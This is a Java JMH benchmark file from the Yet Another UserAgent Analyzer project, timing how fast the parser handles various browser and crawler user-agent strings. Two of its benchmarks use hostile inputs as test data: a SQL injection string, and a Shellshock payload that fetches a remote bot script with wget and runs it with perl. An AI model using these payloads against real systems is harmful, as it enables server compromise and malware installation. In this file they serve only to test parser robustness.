/*
 * Yet Another UserAgent Analyzer
 * Copyright (C) 2013-2019 Niels Basjes
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package nl.basjes.parse.useragent.benchmarks;

import nl.basjes.parse.useragent.UserAgent;
import nl.basjes.parse.useragent.UserAgentAnalyzer;
import org.openjdk.jmh.annotations.Benchmark;
import org.openjdk.jmh.annotations.BenchmarkMode;
import org.openjdk.jmh.annotations.Fork;
import org.openjdk.jmh.annotations.Measurement;
import org.openjdk.jmh.annotations.Mode;
import org.openjdk.jmh.annotations.OutputTimeUnit;
import org.openjdk.jmh.annotations.Scope;
import org.openjdk.jmh.annotations.State;
import org.openjdk.jmh.annotations.Warmup;
import org.openjdk.jmh.runner.Runner;
import org.openjdk.jmh.runner.RunnerException;
import org.openjdk.jmh.runner.options.Options;
import org.openjdk.jmh.runner.options.OptionsBuilder;

import java.util.concurrent.TimeUnit;

@Warmup(iterations = 20)
@Measurement(iterations = 10)
@Fork(1)
@BenchmarkMode(Mode.AverageTime)
@OutputTimeUnit(TimeUnit.MILLISECONDS)
public class AnalyzerBenchmarks {

    @State(Scope.Benchmark)
    public static class ThreadState {
        final UserAgentAnalyzer uaa;
        public ThreadState() {
            uaa = UserAgentAnalyzer.newBuilder()
                .withoutCache()
                .hideMatcherLoadStats()
                .build();
            uaa.parse((String)null);
        }
    }

    @Benchmark
    public UserAgent android6Chrome46(ThreadState state) {
        return state.uaa.parse("Mozilla/5.0 (Linux; Android 6.0; Nexus 6 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) " +
            "Chrome/46.0.2490.76 Mobile Safari/537.36");
    }

    @Benchmark
    public UserAgent androidPhone(ThreadState state) {
        return state.uaa.parse("Mozilla/5.0 (Linux; Android 5.0.1; ALE-L21 Build/HuaweiALE-L21) AppleWebKit/537.36 (KHTML, like Gecko) " +
            "Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36");
    }

    @Benchmark
    public UserAgent googlebot(ThreadState state) {
        return state.uaa.parse("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
    }

    @Benchmark
    public UserAgent googleBotMobileAndroid(ThreadState state) {
        return state.uaa.parse("Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) " +
            "Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
    }

    @Benchmark
    public UserAgent googleAdsBot(ThreadState state) {
        return state.uaa.parse("AdsBot-Google (+http://www.google.com/adsbot.html)");
    }

    @Benchmark
    public UserAgent googleAdsBotMobile(ThreadState state) {
        return state.uaa.parse("Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) " +
            "Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)");
    }

    @Benchmark
    public UserAgent iPhone(ThreadState state) {
        return state.uaa.parse("Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) " +
            "Version/9.0 Mobile/13F69 Safari/601.1");
    }

    @Benchmark
    public UserAgent iPhoneFacebookApp(ThreadState state) {
        return state.uaa.parse("Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) " +
            "Mobile/13G34 [FBAN/FBIOS;FBAV/61.0.0.53.158;FBBV/35251526;FBRV/0;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;" +
            "FBSV/9.3.3;FBSS/2;FBCR/vfnl;FBID/phone;FBLC/nl_NL;FBOP/5]");
    }

    @Benchmark
    public UserAgent iPad(ThreadState state) {
        return state.uaa.parse("Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) " +
            "Version/9.0 Mobile/13F69 Safari/601.1");
    }

    @Benchmark
    public UserAgent win7ie11(ThreadState state) {
        return state.uaa.parse("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko");
    }

    @Benchmark
    public UserAgent win10Edge13(ThreadState state) {
        return state.uaa.parse("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) " +
            "Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586");
    }

    @Benchmark
    public UserAgent win10Chrome51(ThreadState state) {
        return state.uaa.parse("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) " +
            "Chrome/51.0.2704.103 Safari/537.36");
    }

    @Benchmark
    public UserAgent win10IE11(ThreadState state) {
        return state.uaa.parse("Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
    }

    @Benchmark
    public UserAgent hackerSQL(ThreadState state) {
        return state.uaa.parse("-8434))) OR 9695 IN ((CHAR(113)+CHAR(107)+CHAR(106)+CHAR(118)+CHAR(113)+(SELECT " +
            "(CASE WHEN (9695=9695) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(118)+CHAR(113))) AND (((4283=4283");
    }

    @Benchmark
    public UserAgent hackerShellShock(ThreadState state) {
        return state.uaa.parse("() { :;}; /bin/bash -c \\\"\"wget -O /tmp/bbb ons.myftp.org/bot.txt; perl /tmp/bbb\\\"\"");
    }

    public static void main(String[] args) throws RunnerException {
        Options opt = new OptionsBuilder()
            .include(AnalyzerBenchmarks.class.getSimpleName())
            .build();

        new Runner(opt).run();
    }
}
